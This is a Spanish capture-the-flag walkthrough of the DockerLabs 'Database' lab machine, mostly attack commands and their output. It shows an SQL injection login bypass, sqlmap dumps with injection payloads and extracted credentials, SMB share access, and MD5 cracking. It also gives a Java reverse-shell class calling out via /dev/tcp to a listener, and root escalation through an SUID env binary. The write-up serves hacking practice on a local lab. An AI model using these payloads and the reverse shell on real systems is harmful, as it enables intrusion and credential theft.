---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Database DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip database.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh database.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-13 10:19 EST
Nmap scan report for asucar.dl (172.17.0.2)
Host is up (0.000025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-13T15:19:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds
```

Si entramos en la pagina que tiene subida, vemos que hay un login, si probamos a un `SQL Injection` simple:

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Veremos lo siguiente:

```
Bienvenido Dylan! Has accedido correctamente.
```

Por lo que es vulnerable, por lo que capturaremos la peticion con `BurpSuite` del login que sea erroneo `admin:admin` y lo volcaremos en un `request.txt` viendose algo asi:

```
POST /index.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/index.php
Cookie: PHPSESSID=p29hiivvqob55o4h5e3ipt84m8
Upgrade-Insecure-Requests: 1

name=admin&password=admin&submit=
```

Por lo que haremos lo siguiente:

## sqlmap

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:21:42 /2024-12-13/

[10:21:42] [INFO] parsing HTTP request from 'request.txt'
[10:21:43] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:21:43] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
[10:21:53] [INFO] testing if the target URL content is stable
[10:21:53] [WARNING] POST parameter 'name' does not appear to be dynamic
[10:21:53] [INFO] heuristic (basic) test shows that POST parameter 'name' might be injectable (possible DBMS: 'MySQL')
[10:21:53] [INFO] testing for SQL injection on POST parameter 'name'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[10:21:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:21:57] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:21:57] [INFO] testing 'Generic inline queries'
[10:21:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:21:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[10:21:57] [INFO] POST parameter 'name' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable 
[10:21:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[10:21:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[10:21:57] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[10:21:57] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[10:21:57] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[10:21:57] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[10:21:57] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[10:21:57] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[10:21:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:21:58] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[10:21:58] [INFO] POST parameter 'name' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[10:21:58] [INFO] testing 'MySQL inline queries'
[10:21:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[10:22:48] [INFO] POST parameter 'name' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[10:22:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[10:23:38] [INFO] POST parameter 'name' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[10:23:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:23:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[10:23:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:23:38] [INFO] target URL appears to be UNION injectable with 2 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
[10:24:18] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[10:24:18] [INFO] testing 'MySQL UNION query (79) - 21 to 40 columns'
[10:24:19] [INFO] testing 'MySQL UNION query (79) - 41 to 60 columns'
[10:24:19] [INFO] testing 'MySQL UNION query (79) - 61 to 80 columns'
[10:24:20] [INFO] testing 'MySQL UNION query (79) - 81 to 100 columns'
[10:24:20] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 171 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-1932' OR 2204=2204#&password=admin&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=admin' OR (SELECT 6286 FROM(SELECT COUNT(*),CONCAT(0x71706a7a71,(SELECT (ELT(6286=6286,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zlkZ&password=admin&submit=

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin' AND (SELECT 8652 FROM (SELECT(SLEEP(5)))mqiA)-- kdlu&password=admin&submit=
---
[10:24:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:24:22] [INFO] fetching database names
[10:24:22] [INFO] retrieved: 'information_schema'
[10:24:22] [INFO] retrieved: 'register'
[10:24:22] [INFO] retrieved: 'performance_schema'
[10:24:22] [INFO] retrieved: 'sys'
[10:24:22] [INFO] retrieved: 'mysql'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

[10:24:22] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:24:22 /2024-12-13/
```

Vemos que nos saca algunas bases de datos, entre ellas elegiremos la llamda `register`:

```shell
sqlmap -r request.txt -D register --tables --batch
```

Info:

```
       ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.8.7#stable}                                                                                                                     
|_ -| . ["]     | .'| . |                                                                                                                                    
|___|_  [.]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:28:17 /2024-12-13/

[10:28:17] [INFO] parsing HTTP request from 'request.txt'
[10:28:17] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:28:17] [INFO] resuming back-end DBMS 'mysql' 
[10:28:17] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-1932' OR 2204=2204#&password=admin&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=admin' OR (SELECT 6286 FROM(SELECT COUNT(*),CONCAT(0x71706a7a71,(SELECT (ELT(6286=6286,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zlkZ&password=admin&submit=

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin' AND (SELECT 8652 FROM (SELECT(SLEEP(5)))mqiA)-- kdlu&password=admin&submit=
---
[10:28:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:28:17] [INFO] fetching tables for database: 'register'
[10:28:17] [INFO] retrieved: 'users'
Database: register
[1 table]
+-------+
| users |
+-------+

[10:28:17] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:28:17 /2024-12-13/
```

Sacamos la tabla `users` por lo que ahora sacaremos las columnas de dicha tabla:

```shell
sqlmap -r request.txt -D register -T users --dump --batch
```

Info:

```
        ___
       __H__                                                                                                                                                 
 ___ ___[.]_____ ___ ___  {1.8.7#stable}                                                                                                                     
|_ -| . [(]     | .'| . |                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:29:34 /2024-12-13/

[10:29:34] [INFO] parsing HTTP request from 'request.txt'
[10:29:34] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[10:29:34] [INFO] resuming back-end DBMS 'mysql' 
[10:29:34] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: name=-1932' OR 2204=2204#&password=admin&submit=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: name=admin' OR (SELECT 6286 FROM(SELECT COUNT(*),CONCAT(0x71706a7a71,(SELECT (ELT(6286=6286,1))),0x7176717071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zlkZ&password=admin&submit=

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=admin' AND (SELECT 8652 FROM (SELECT(SLEEP(5)))mqiA)-- kdlu&password=admin&submit=
---
[10:29:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[10:29:34] [INFO] fetching columns for table 'users' in database 'register'
[10:29:34] [INFO] retrieved: 'username'
[10:29:34] [INFO] retrieved: 'varchar(30)'
[10:29:34] [INFO] retrieved: 'passwd'
[10:29:34] [INFO] retrieved: 'varchar(30)'
[10:29:34] [INFO] fetching entries for table 'users' in database 'register'
[10:29:34] [INFO] retrieved: 'KJSDFG789FGSDF78'
[10:29:34] [INFO] retrieved: 'dylan'
Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+

[10:29:34] [INFO] table 'register.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
[10:29:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 10:29:34 /2024-12-13/
```

Por lo que vemos hemos sacados las credenciales del usuario `dylan`, si probamos por `SSH` veremos que no funciona, por lo que listaremos los recursos compartidos de `SMB`:

## smbclient

```shell
smbclient -L //<IP>/ -N
```

Info:

```

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shared          Disk      
        IPC$            IPC       IPC Service (dc5243b810a5 server (Samba, Ubuntu))
```

Y ahora probaremos a meternos con las credenciales de `dylan` al recurso compartido llamado `shared`:

```shell
smbclient //<IP>/shared -U dylan
```

Si metemos la contraseña `KJSDFG789FGSDF78` veremos que estamos dentro y si hacemos un `ls`:

```
smb: \> ls
  .                                   D        0  Mon May 27 03:58:52 2024
  ..                                  D        0  Mon May 27 03:25:46 2024
  augustus.txt                        N       33  Mon May 27 03:58:52 2024

                82083148 blocks of size 1024. 56712468 blocks available
```

Por lo que nos descargamos el archivo con el siguiente comando:

```shell
get augustus.txt
```

### Escalate user agustus

Y si leemos su contenido, veremos lo siguiente:

```
061fba5bdfc076bb7362616668de87c8
```

Vemos que es un `hash` `MD5` aparentemente, por lo que si intentamos crackearlo:

URL = https://iotools.cloud/es/tool/md5-decrypt/

Veremos lo siguiente:

```
lovely
```

Por lo que podemos deducir que es la contraseña del nombre de usuario `agusutus`:

```shell
ssh augustus@<IP>
```

Si metemos la contraseña `lovely` veremos que estamos dentro.

## Escalate user dylan

Si hacemos `sudo -l` y metemos la contraseña del usuario, veremos lo siguiente:

```
Matching Defaults entries for augustus on dc5243b810a5:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User augustus may run the following commands on dc5243b810a5:
    (dylan) /usr/bin/java
```

Por lo que podemos ejecutar el binario `java` como `dylan`, por lo que haremos lo siguiente:

Crearemos un archivo `.java`:

```shell
cd /tmp
nano Shell.java

#Dentro del nano
public class Shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/<IP>/<PORT> 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

Lo guardamos y hacemos lo siguiente, tendremos que compilar el archivo a `java` para ejecutarlo posteriormente:

```
javac Shell.java
```

```shell
jar -cvfe Shell.jar Shell Shell.class
```

Nos preparamos a la escucha y lo ejecutamos:

```shell
nc -lvnp <PORT>
```

```shell
sudo -u dylan /usr/bin/java -jar Shell.jar
```

Y si ahora volvemos a la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 44782
dylan@dc5243b810a5:/tmp$
```

## Escalate Privileges

Si buscamos permisos `SUID`:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
1460271    332 -rwsr-xr-x   1 root     root       338536 Jan  2  2024 /usr/lib/openssh/ssh-keysign
  1460211     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1455622     44 -rwsr-xr-x   1 root     root          44808 Feb  6  2024 /usr/bin/chsh
  1455747     40 -rwsr-xr-x   1 root     root          40496 Feb  6  2024 /usr/bin/newgrp
  1455758     60 -rwsr-xr-x   1 root     root          59976 Feb  6  2024 /usr/bin/passwd
  1455822     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
  1455684     72 -rwsr-xr-x   1 root     root          72072 Feb  6  2024 /usr/bin/gpasswd
  1455742     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
  1455848     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
  1455616     72 -rwsr-xr-x   1 root     root          72712 Feb  6  2024 /usr/bin/chfn
  1478841     44 -rwsr-xr-x   1 root     root          43976 Jan  8  2024 /usr/bin/env
  1479396    228 -rwsr-xr-x   1 root     root         232416 Apr  3  2023 /usr/bin/sudo
```

Vemos que hay uno interesante llamado:

```
1478841   44 -rwsr-xr-x   1 root     root     43976 Jan  8  2024 /usr/bin/env
```

Por lo que haremos lo siguiente:

```shell
env /bin/sh -p
```

Con esto ya seremos `root` por lo que si hacemos `whoami`:

```shell
whoami
root
```

Ya habremos terminado la maquina.
